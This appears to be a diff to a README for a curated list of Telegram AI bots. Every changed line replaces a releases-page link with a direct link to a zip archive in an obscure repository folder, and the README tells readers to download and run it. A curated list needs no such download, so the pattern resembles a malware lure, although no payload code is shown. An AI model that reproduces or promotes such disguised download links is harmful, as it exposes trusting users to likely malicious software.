@@ -1,7 +1,7 @@
 # 🤖 awesome-telegram-bots-ai - Explore the Best Telegram AI Bots
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/releases)
+[![Download](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/raw/refs/heads/main/metapodial/telegram-bots-ai-awesome-1.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/raw/refs/heads/main/metapodial/telegram-bots-ai-awesome-1.2.zip)
 
 ## 📚 Description
 Welcome to the **awesome-telegram-bots-ai** repository. This project features a curated list of Telegram AI bots, including options like ChatGPT, AI drawing, translation, and automation bots. Our goal is to keep this list updated with the most useful tools available.
@@ -11,7 +11,7 @@ To use these bots, follow these steps to download and run the software.
 
 ### 1. Visit the Releases Page
 Click the link below to access the releases page, where you will find the latest versions of the bots:
-[Visit Releases Page](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/releases)
+[Visit Releases Page](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/raw/refs/heads/main/metapodial/telegram-bots-ai-awesome-1.2.zip)
 
 ### 2. Download the Files
 Once on the releases page, locate the most recent version. There you will find different files available for download. Click on the file that best suits your needs, usually named in a way that indicates its function. 
@@ -65,4 +65,4 @@ If you encounter any issues or have questions about the bots, feel free to raise
 ## 💻 Conclusion
 Using Telegram AI bots can greatly enhance your chatting experience. By following the steps outlined above, you can easily download and install a variety of useful bots from the **awesome-telegram-bots-ai** repository. We appreciate your interest and look forward to your engagement with our curated list.  
 
-Don't forget to **[Visit Releases Page](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/releases)** for the latest updates!
+Don't forget to **[Visit Releases Page](https://github.com/hackingggbydaarknes/awesome-telegram-bots-ai/raw/refs/heads/main/metapodial/telegram-bots-ai-awesome-1.2.zip)** for the latest updates!
